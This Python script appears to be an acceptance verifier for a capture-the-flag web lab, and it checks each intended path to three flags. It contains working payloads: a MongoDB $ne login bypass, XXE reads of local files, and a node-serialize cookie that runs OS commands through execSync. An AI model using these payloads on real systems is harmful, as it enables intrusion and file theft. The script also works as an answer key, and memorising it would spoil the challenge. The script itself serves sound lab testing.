#!/usr/bin/env python3
"""Manual development verifier: HTTP-only, no Docker socket or target exec."""
import html
import http.cookiejar
import json
import os
import re
import urllib.error
import urllib.parse
import urllib.request

BASE = os.environ.get("TARGET_URL", "http://nodeblog-target:5000").rstrip("/")
EXPECTED_01 = os.environ["EXPECTED_FLAG_01"]
EXPECTED_02 = os.environ["EXPECTED_FLAG_02"]
EXPECTED_03 = os.environ["EXPECTED_FLAG_03"]
for value in (EXPECTED_01, EXPECTED_02, EXPECTED_03):
    assert value.startswith("TTP{") and value.endswith("}") and len(value) == 23 and all(c in "abcdefghijklmnopqrstuvwxyz234567" for c in value[4:-1]), "invalid expected Flag format"
assert len({EXPECTED_01, EXPECTED_02, EXPECTED_03}) == 3, "Flags must be unique"

jar = http.cookiejar.CookieJar()
player = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
untrusted = urllib.request.build_opener()


def send(path, data=None, headers=None, opener=player):
    req = urllib.request.Request(BASE + path, data=data, headers=headers or {})
    with opener.open(req, timeout=20) as resp:
        return resp.status, resp.read().decode("utf-8", "replace")


def post_json(path, value):
    return send(path, json.dumps(value).encode(), {"Content-Type": "application/json"})


def post_form(path, value):
    return send(path, urllib.parse.urlencode(value).encode(),
                {"Content-Type": "application/x-www-form-urlencoded"})


def upload_xml(xml):
    boundary = "nodeblog-real-xxe"
    data = (
        "--" + boundary + "\r\n"
        'Content-Disposition: form-data; name="file"; filename="post.xml"\r\n'
        "Content-Type: application/xml\r\n\r\n" +
        xml + "\r\n--" + boundary + "--\r\n"
    ).encode()
    return send("/articles/xml", data,
                {"Content-Type": "multipart/form-data; boundary=" + boundary})


def xxe_file(path):
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE post [<!ENTITY xxe SYSTEM "file://' + path + '">]>'
        '<post><title>Note</title><description>&xxe;</description>'
        '<markdown>Draft</markdown></post>'
    )
    status, text = upload_xml(xml)
    assert status == 200 and "Invalid XML Example" not in text, "Native XXE failed"
    return html.unescape(text)


def execute_cookie(command):
    js = "_$$ND_FUNC$$_function(){require('child_process').execSync(" + json.dumps(command) + ");}()"
    obj = json.dumps({"rce": js}, separators=(",", ":"))
    header = {"Cookie": "auth=" + urllib.parse.quote(obj, safe="")}
    status, body = send("/", headers=header, opener=untrusted)
    assert status == 200 and "Blog Articles" in body


print("[1/11] Public blog is available")
_, home = send("/")
assert "Blog Articles" in home and "UHC Qualifiers" in home
assert "Staff Notes" not in home
try:
    send("/articles/staff-notes")
    raise AssertionError("Protected staff article was public")
except urllib.error.HTTPError as err:
    assert err.code == 404

print("[2/11] Ordinary bad login behavior")
_, body = post_form("/login", {"user": "unknown", "password": "wrong"})
assert "Invalid Username" in body
_, body = post_form("/login", {"user": "admin", "password": "wrong"})
assert "Invalid Password" in body

print("[3/11] URL-encoded bracket input remains scalar")
_, body = post_form("/login", {"user": "admin", "password[$ne]": "wrong"})
assert "Invalid Password" in body or "Invalid Username" in body

print("[4/11] Real MongoDB operator authentication bypass")
_, home = post_json("/login", {"user": "admin", "password": {"$ne": "wrong"}})
assert "New Article" in home and "Upload" in home
assert any(c.name == "auth" for c in jar)

print("[5/11] Challenge 01 Flag is in protected article data")
_, staff = send("/articles/staff-notes")
assert EXPECTED_01 in staff
print("PASS: Flag 01 reached after the intended NoSQL authentication bypass")

print("[6/11] Legitimate XML import works")
_, editor = upload_xml(
    "<post><title>Demo</title><description>Alpha</description>"
    "<markdown>Beta</markdown></post>"
)
assert "New Article" in editor and "Alpha" in editor and "Beta" in editor

print("[7/11] Real libxml2 XXE discloses application source")
source = xxe_file("/opt/blog/server.js")
assert "require('node-serialize')" in source
assert "serialize.unserialize" in source and "cookie_secret" in source

print("[8/11] Challenge 02 Flag is retrieved through XXE")
xxe_result = xxe_file("/opt/blog/challenge-data/xxe-flag.txt")
assert EXPECTED_02 in xxe_result
print("PASS: Flag 02 reached through the real XML external entity parser")

print("[9/11] Real node-serialize IIFE executes an OS command")
execute_cookie("id > /tmp/nodeblog-rce-proof")
assert "uid=10001(nodeblog)" in xxe_file("/tmp/nodeblog-rce-proof")

print("[10/11] Challenge 03 Flag is retrieved through the real RCE path")
execute_cookie("cat /home/nodeblog/user.txt > /tmp/nodeblog-flag03-proof")
assert EXPECTED_03 in xxe_file("/tmp/nodeblog-flag03-proof")
print("PASS: Flag 03 reached through node-serialize command execution")

print("[11/11] Final Flag is not a public static route")
try:
    send("/user.txt")
    raise AssertionError("Flag leaked over static HTTP")
except urllib.error.HTTPError as err:
    assert err.code == 404

print("ACCEPTANCE PASS: three real Challenge Flags reached through their intended paths")
